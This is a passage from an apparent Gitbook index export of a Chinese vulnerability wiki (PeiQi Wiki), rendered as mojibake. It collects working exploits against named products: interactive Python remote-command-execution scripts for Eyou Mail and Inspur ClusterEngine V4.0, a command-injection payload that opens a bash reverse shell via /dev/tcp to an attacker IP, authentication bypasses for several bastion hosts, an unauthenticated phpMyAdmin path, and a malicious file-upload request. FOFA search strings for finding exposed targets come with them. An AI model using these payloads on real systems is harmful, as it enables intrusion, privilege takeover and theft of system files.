and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´ ,æˆåŠŸæ‰§è¡Œ cat /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, cmd) else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/webadm/?q=moni_detail.do&action=gragh\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"type='|{}||'\".format(cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() cmd = 'cat /etc/passwd' target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url, cmd) Goby & POC [!NOTE] Eyou Mail system RCE PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®‰å¤©/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®‰å¤©/","title":"å®‰å¤©","keywords":"","body":"å®‰å¤© å®‰å¤© é«˜çº§å¯æŒç»­å¨èƒå®‰å…¨æ£€æµ‹ç³»ç»Ÿ è¶Šæƒè®¿é—®æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-18 18:19:28 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®‰å¤©/å®‰å¤© é«˜çº§å¯æŒç»­å¨èƒå®‰å…¨æ£€æµ‹ç³»ç»Ÿ è¶Šæƒè®¿é—®æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®‰å¤©/å®‰å¤© é«˜çº§å¯æŒç»­å¨èƒå®‰å…¨æ£€æµ‹ç³»ç»Ÿ è¶Šæƒè®¿é—®æ¼æ´.html","title":"å®‰å¤© é«˜çº§å¯æŒç»­å¨èƒå®‰å…¨æ£€æµ‹ç³»ç»Ÿ è¶Šæƒè®¿é—®æ¼æ´","keywords":"","body":"å®‰å¤© é«˜çº§å¯æŒç»­å¨èƒå®‰å…¨æ£€æµ‹ç³»ç»Ÿ è¶Šæƒè®¿é—®æ¼æ´ æ¼æ´æè¿° å®‰å¤© é«˜çº§å¯æŒç»­å¨èƒå®‰å…¨æ£€æµ‹ç³»ç»Ÿ å­˜åœ¨è¶Šæƒè®¿é—®æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å·¥å…·ä¿®æ”¹ç‰¹å®šçš„è¿”å›åŒ…å¯¼è‡´è¶Šæƒåå°æŸ¥çœ‹æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] å®‰å¤© é«˜çº§å¯æŒç»­å¨èƒå®‰å…¨æ£€æµ‹ç³»ç»Ÿ FOFA [!NOTE] title=\"é«˜çº§å¯æŒç»­å¨èƒå®‰å…¨æ£€æµ‹ç³»ç»Ÿ\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ å…¶ä¸­æŠ“åŒ…è¿‡ç¨‹ä¸­å‘ç°è¯·æ±‚çš„ä¸€ä¸ªèº«ä»½éªŒè¯ Url {\"role\": \"\", \"login_status\": false, \"result\": \"ok\"} å…¶ä¸­ login_status ä¸º false, å°†å‚æ•°ä½¿ç”¨ Burp æ›¿æ¢å“åº”åŒ…ä¸º true è¯·æ±‚ /api/user/islogin æ—¶æˆåŠŸè¶Šè¿‡èº«ä»½éªŒè¯ å†æ¬¡è®¿é—®é¦–é¡µéªŒè¯è¶Šæƒæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ€ç¦è¿ªå ¡å’æœº/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ€ç¦è¿ªå ¡å’æœº/","title":"æ€ç¦è¿ªå ¡å’æœº","keywords":"","body":"æ€ç¦è¿ªå ¡å’æœº æ€ç¦è¿ªå ¡å’æœº ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-29 17:53:10 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ€ç¦è¿ªå ¡å’æœº/æ€ç¦è¿ªå ¡å’æœº ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ€ç¦è¿ªå ¡å’æœº/æ€ç¦è¿ªå ¡å’æœº ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´.html","title":"æ€ç¦è¿ªå ¡å’æœº ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´","keywords":"","body":"æ€ç¦è¿ªå ¡å’æœº ä»»æ„â½¤æˆ·ç™»å½•æ¼æ´ æ¼æ´æè¿° æ€ç¦è¿ªå ¡å’æœºå­˜åœ¨ä»»æ„â½¤æˆ·ç™»å½•æ¼æ´ï¼Œæ¶æ„æ”»å‡»è€…å¯ä»¥ç»•è¿‡å ¡å’æœºçš„å¯†ç ç™»å½•éªŒè¯æœºåˆ¶ï¼Œä»¥ä»» æ„â½¤æˆ·èº«ä»½éšæ„ç™»å½•å ¡å’æœºWebç®¡ç†ç•Œâ¾¯ï¼Œå¹¶å¯ä»¥æ­£å¸¸çš„ä½¿â½¤è´¦æˆ·æƒé™å»æ“ä½œã€‚ æ¼æ´å½±å“ [!NOTE] æ€ç¦è¿ªå ¡å’æœº FOFA [!NOTE] \"Logbaseè¿ç»´å®‰å…¨ç®¡ç†ç³»ç»Ÿ\" æ¼æ´å¤ç° è·å–INFOå­—æ®µï¼Œu1å‚æ•°å€¼ä¸ºâ½¤æˆ·å POST /bhost/set_session HTTP/1.1 Host: xxx.xxx.xxx.xx u1=admin&m1= è·å¾—ï¼š{\"result\":true,\"info\":\"1562205376847\",\"ErrMsg\":\"\"} å¸¦â¼ŠINFOå­—æ®µè¿›â¼Šå¦‚ä¸‹è¯·æ±‚çš„ a0 å‚æ•°å€¼ä¸­,uCodeå‚æ•°å€¼ä¸ºâ½¤æˆ·å POST /bhost/login_link HTTP/1.1 Host: xxx.xxx.xxx.xxx a0=1562205376847&a1=&a10=2019-01- 01+10:10:10&ha=CADFDF26E649FB6284D2FD424BD294B6&uCode=admin&vdcode= åˆ©ç”¨åå³å¯ç™»å½•åå° PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é½æ²»å ¡å’æœº/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é½æ²»å ¡å’æœº/","title":"é½æ²»å ¡å’æœº","keywords":"","body":"é½æ²»å ¡å’æœº é½æ²»å ¡å’æœº ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-09 23:39:46 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é½æ²»å ¡å’æœº/é½æ²»å ¡å’æœº ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é½æ²»å ¡å’æœº/é½æ²»å ¡å’æœº ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´.html","title":"é½æ²»å ¡å’æœº ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´","keywords":"","body":"é½æ²»å ¡å’æœº ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´ æ¼æ´æè¿° é½æ²»å ¡å’æœº å­˜åœ¨ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´ï¼Œè®¿é—®ç‰¹å®šçš„Urlå³å¯è·å¾—åå°æƒé™ æ¼æ´å½±å“ [!NOTE] é½æ²»å ¡å’æœº FOFA [!NOTE] app=\"é½æ²»ç§‘æŠ€-å ¡å’æœº\" æ¼æ´å¤ç° æ¼æ´POCä¸º http://xxx.xxx.xxx.xxx/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ shterm(QiZhi) Fortress Arbitrary User Login PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®å¡”è¿ç»´ç®¡ç†é¢æ¿/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®å¡”è¿ç»´ç®¡ç†é¢æ¿/","title":"å®å¡”è¿ç»´ç®¡ç†é¢æ¿","keywords":"","body":"å®å¡”è¿ç»´ç®¡ç†é¢æ¿ å®å¡” phpmyadmin æœªæˆæƒè®¿é—®æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-13 13:09:02 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®å¡”è¿ç»´ç®¡ç†é¢æ¿/å®å¡” phpmyadminæœªæˆæƒè®¿é—®æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å®å¡”è¿ç»´ç®¡ç†é¢æ¿/å®å¡” phpmyadminæœªæˆæƒè®¿é—®æ¼æ´.html","title":"å®å¡” phpmyadminæœªæˆæƒè®¿é—®æ¼æ´.md","keywords":"","body":"å®å¡” phpmyadminæœªæˆæƒè®¿é—®æ¼æ´ æ¼æ´æè¿° ã€å®å¡”é¢æ¿ã€‘ç´§æ€¥å®‰å…¨æ›´æ–°é€šçŸ¥ï¼ŒLinuxé¢æ¿7.4.2ç‰ˆæœ¬/Windowsé¢æ¿6.8ç‰ˆæœ¬å­˜åœ¨å®‰å…¨éšæ‚£ï¼Œå…¶ä»–ç‰ˆæœ¬æ— æ­¤é£é™©ã€‚å·²å‘å¸ƒç´§æ€¥æ›´æ–°ï¼Œè¯·æ‰€æœ‰ä½¿ç”¨æ­¤ç‰ˆæœ¬çš„ç”¨æˆ·åŠ¡å¿…å‡çº§åˆ°æœ€æ–°ç‰ˆï¼Œæ›´æ–°æ–¹æ³•ï¼Œç™»å½•é¢æ¿ç›´æ¥å‡çº§æ›´æ–°å³å¯ï¼Œå¦‚æ›´æ–°å‡ºç°é—®é¢˜ï¼Œè¯·ç™»å½•å®å¡”è®ºå›åé¦ˆæˆ–è€…è”ç³»å®¢æœåé¦ˆ å½±å“ç‰ˆæœ¬ [!NOTE] Linuxæ­£å¼ç‰ˆ7.4.2 Linuxæµ‹è¯•ç‰ˆ7.5.13 Windowsæ­£å¼ç‰ˆ6.8 æ¼æ´å¤ç° è®¿é—® http://xxx.xxx.xxx.xxx:888/pma å³å¯ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æµªæ½®/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æµªæ½®/","title":"æµªæ½®","keywords":"","body":"æµªæ½® æµªæ½®ClusterEngineV4.0 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-21224 æµªæ½®ClusterEngineV4.0 ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´ æµªæ½®ClusterEngineV4.0 sysShell è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-12 18:44:46 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æµªæ½®/æµªæ½®ClusterEngineV4.0 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-21224.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æµªæ½®/æµªæ½®ClusterEngineV4.0 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-21224.html","title":"æµªæ½®ClusterEngineV4.0 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-21224","keywords":"","body":"æµªæ½®ClusterEngineV4.0 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-21224 æ¼æ´æè¿° æµªæ½®æœåŠ¡å™¨ç¾¤é›†ç®¡ç†ç³»ç»Ÿå­˜åœ¨å±é™©å­—ç¬¦æœªè¿‡æ»¤ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œ æ¼æ´å½±å“ [!NOTE] æµªæ½®ClusterEngineV4.0 FOFA [!NOTE] title=\"TSCEV4.0\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ ç”±äºç™»å½•é¡µé¢æ²¡æœ‰å‘ç°éªŒè¯ç ï¼Œè¿›è¡Œè´¦å·çˆ†ç ´ å½“burpsuiteçˆ†ç ´å®Œæˆæ—¶ï¼Œæ³¨æ„åˆ°POSTæ•°æ®ä¸­å¦‚æœå¸¦æœ‰ ;' ï¼Œå“åº”æ•°æ®åŒ…å‘ç”Ÿå¼‚å¸¸ã€‚ é€šè¿‡å“åº”åŒ…ä¿¡æ¯ï¼ŒçŒœæµ‹å¯èƒ½å­˜åœ¨ä¸€ä¸ªè¿œç¨‹æ‰§è¡Œä»£ç æ¼æ´ï¼Œå¹¶å°†æ­¤æ•°æ®åŒ…æ”¾åœ¨repeaterä¸­ï¼Œæˆ‘å‘ç°å¦‚æœå‘å¸ƒæ•°æ®ä¸­æœ‰ ä¸€ä¸ª ' ï¼Œç³»ç»Ÿå°†æŠ›å‡ºå¼‚å¸¸ã€‚ è¿›ä¸€æ­¥æµ‹è¯•æ—¶ï¼Œæˆ‘å‘ç°usernameå‚æ•°æˆ–passwordä»»ä¸€å‚æ•°å¦‚æœåŒ…å« ' ï¼Œå°†å¼•å‘æ­¤å¼‚å¸¸ å®šå°è¯•å‘é€ ' ' æ¥æŸ¥çœ‹å“åº”åŒ…ã€‚ æˆ‘æ³¨æ„åˆ° grep å‘½ä»¤é”™è¯¯ï¼ŒæœåŠ¡ç«¯çš„ä»£ç å¯èƒ½æ˜¯è¿™æ · var1 = `grep xxxx` var2 = $(python -c \"from crypt import crypt;print crypt('$username','$1$$var1')\") å°è¯•å‘é€ -V å’Œ --help æ¥æŸ¥çœ‹å“åº”åŒ…ï¼Œå“åº”åŒ…è¯å®äº†çŒœæµ‹ å°è¯•è¯»å– /etc/passswd å°è¯•åˆ—ç›®å½• ç¡®è®¤å­˜åœ¨ä¸€ä¸ªè¿œç¨‹æ‰§è¡Œå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œç»è¿‡fuzzï¼Œå¾—åˆ°ä»¥ä¸‹payload åå¼¹ shell op=login&username=1 2\\',\\'1\\'\\); `bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.16.11.81%2F80%200%3E%261` payloadå‘é€å, åœ¨ kali linux æœåŠ¡å™¨ä¸Šè·å–äº†ä¸€ä¸ª root æƒé™çš„ shell ä¸Šé¢æ˜¯åŸæ–‡çš„æµ‹è¯•æ€è·¯ï¼Œä½†ç»è¿‡é‡æ–°æµ‹è¯•ä¹‹åå‘ç°è¿˜æœ‰å¦ä¸€ç§ç®€å•æ–¹æ³• POCæµ‹è¯•(å‡ºç° root:x:0:0 åˆ™å­˜åœ¨æ¼æ´) op=login&username=test`$(cat /etc/passwd)` {\"err\":\"/bin/sh: root:x:0:0:root:/root:/bin/bash: No such file or directory\\n\",\"exitcode\":1,\"out\":\"the user test does not exist\\nerror:1\\n\"} åå¼¹shell op=login&username=test`$(bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}}%2F{PORT}%200%3E%261)` æ¼æ´åˆ©ç”¨POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: æµªæ½®ClusterEngineV4.0 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mIP >>> xxx.xxx.xxx.xxx:9999 \\033[0m') print('+ \\033[36mPORT >>> 9999 \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", } data = \"op=login&username=test`$(cat /etc/passwd)`\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=4) etc_passwd = re.findall(r'\\{\"err\":\"/bin/sh: (.*?): No such', response.text) if response.status_code == 200 and \"root:x:0:0\" in response.text: print(\"\\033[32m[o] ç›®æ ‡ {} å¯èƒ½å­˜åœ¨æ¼æ´, å“åº”ä¸º:{} \\033[0m\".format(target_url, etc_passwd[0])) POC_2(target_url) else: print(\"\\033[31m[x] ç›®æ ‡ {} ä¸å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡ {} è¯·æ±‚å¤±è´¥ \\033[0m\".format(target_url)) def POC_2(target_url): IP = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬IP >>> \\033[0m\")) PORT = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬PORT >>> \\033[0m\")) vuln_url = target_url + \"/login\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", } data = \"op=login&username=`bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261`\".format(IP, PORT) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡ {} è¯·æ±‚å¤±è´¥ \\033[0m\".format(target_url)) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!ONTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ ClusterEngineV4.0_RCE å‚è€ƒæ–‡ç«  https://github.com/NS-Sp4ce/Inspur/tree/master/ClusterEngineV4.0%20Vul PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 20:10:17 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æµªæ½®/æµªæ½®ClusterEngineV4.0 ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æµªæ½®/æµªæ½®ClusterEngineV4.0 ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´.html","title":"æµªæ½®ClusterEngineV4.0 ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´","keywords":"","body":"æµªæ½®ClusterEngineV4.0 ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´ æ¼æ´æè¿° æµªæ½®ClusterEngineV4.0 å­˜åœ¨ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´ï¼Œæ„é€ æ¶æ„çš„ç”¨æˆ·åå’Œå¯†ç å³å¯è·å–åå°æƒé™ æ¼æ´å½±å“ [!NOTE] æµªæ½®ClusterEngineV4.0 FOFA [!NOTE] title=\"TSCEV4.0\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ USERï¼š admin|pwd PASS: ä»»æ„ æˆåŠŸç™»é™†åå° [!NOTE] éƒ¨åˆ†åŠŸèƒ½æ˜¯æ— æ³•ä½¿ç”¨çš„ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æµªæ½®/æµªæ½®ClusterEngineV4.0 sysShell ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æµªæ½®/æµªæ½®ClusterEngineV4.0 sysShell ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"æµªæ½®ClusterEngineV4.0 sysShell ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"æµªæ½®ClusterEngineV4.0 sysShell è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° æµªæ½®ClusterEngineV4.0 å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œæ”»å‡»è€…é€šè¿‡å‘é€ç‰¹æ®Šçš„è¯·æ±‚å¯ä»¥è·å–æœåŠ¡å™¨æƒé™ æ¼æ´å½±å“ [!NOTE] æµªæ½®ClusterEngineV4.0 FOFA [!NOTE] title=\"TSCEV4.0\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ å‘é€è¯·æ±‚åŒ… POST /sysShell HTTP/1.1 Host: xxx.xxx.xxx.xxx Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Cookie: lang=cn Cache-Control: max-age=0 Content-Length: 42 op=doPlease&node=cu01&command=cat /etc/passwd [!NOTE] æ³¨æ„å‚æ•° node ä¸­çš„ cu01 éœ€è¦ä¸ºshellé›†ç¾¤ä¸­çš„å­˜åœ¨ä¸»æœº è¿™é‡Œå¯ä»¥é…åˆä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´æŸ¥çœ‹ä¸»æœºå æ¼æ´åˆ©ç”¨ [!NOTE] å¦‚è¿‡å‡ºç° Name or service not è¯·é€šè¿‡ä¸Šè¿°çš„æ–¹æ³•æŸ¥çœ‹ shellé›†ç¾¤ä¸»æœºçš„åç§°ï¼ˆè„šæœ¬é»˜è®¤ cu01ï¼‰ import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: SonicWall SSL-VPN \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url, cmd): vuln_url = target_url + \"/sysShell\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"Cookie\": \"lang=cn\" } data = \"op=doPlease&node=cu01&command=cat /etc/passwd\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data,verify=False, timeout=5) print(\"\\033[32m[o] æ­£åœ¨è¯·æ±‚ {}/sysShell \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´ ,æˆåŠŸæ‰§è¡Œ cat /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, cmd) else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/sysShell\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"Cookie\": \"lang=cn\" } data = \"op=doPlease&node=cu01&command={}\".format(cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() cmd = 'cat /etc/passwd' target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url, cmd) Goby & POC [!NOTE] ClusterEngine V4.0 Shell cluster RCE PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å’Œä¿¡åˆ›å¤©äº‘/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å’Œä¿¡åˆ›å¤©äº‘/","title":"å’Œä¿¡åˆ›å¤©äº‘","keywords":"","body":"å’Œä¿¡åˆ›å¤©äº‘ å’Œä¿¡åˆ›å¤©äº‘æ¡Œé¢ç³»ç»Ÿ è¿œç¨‹å‘½ä»¤æ‰§è¡Œ RCEæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-08 12:49:41 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å’Œä¿¡åˆ›å¤©äº‘/å’Œä¿¡åˆ›å¤©äº‘æ¡Œé¢ç³»ç»Ÿ è¿œç¨‹å‘½ä»¤æ‰§è¡Œ RCEæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å’Œä¿¡åˆ›å¤©äº‘/å’Œä¿¡åˆ›å¤©äº‘æ¡Œé¢ç³»ç»Ÿ è¿œç¨‹å‘½ä»¤æ‰§è¡Œ RCEæ¼æ´.html","title":"å’Œä¿¡åˆ›å¤©äº‘æ¡Œé¢ç³»ç»Ÿ è¿œç¨‹å‘½ä»¤æ‰§è¡Œ RCEæ¼æ´","keywords":"","body":"å’Œä¿¡åˆ›å¤©äº‘æ¡Œé¢ç³»ç»Ÿ è¿œç¨‹å‘½ä»¤æ‰§è¡Œ RCEæ¼æ´ æ¼æ´æè¿° å’Œä¿¡åˆ›å¤©äº‘æ¡Œé¢ç³»ç»Ÿå­˜åœ¨é»˜è®¤é…ç½®å¯¼è‡´æ–‡ä»¶ä¸Šä¼ å¹¶å¯ä»¥è¿œç¨‹å‘½ä»¤æ‰§è¡Œ æ¼æ´å½±å“ [!NOTE] å’Œä¿¡åˆ›å¤©äº‘æ¡Œé¢ç³»ç»Ÿ æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ å‘é€è¯·æ±‚åŒ…å¦‚ä¸‹ POST /Upload/upload_file.php?l=1 HTTP/1.1 Host: xxx.xxx.xx.xxx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,fil;q=0.8 Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv Content-Length: 182 ------WebKitFormBoundaryfcKRltGv Content-Disposition: form-data; name=\"file\"; filename=\"test.php\" Content-Type: image/avif ------WebKitFormBoundaryfcKRltGv-- è®¿é—® 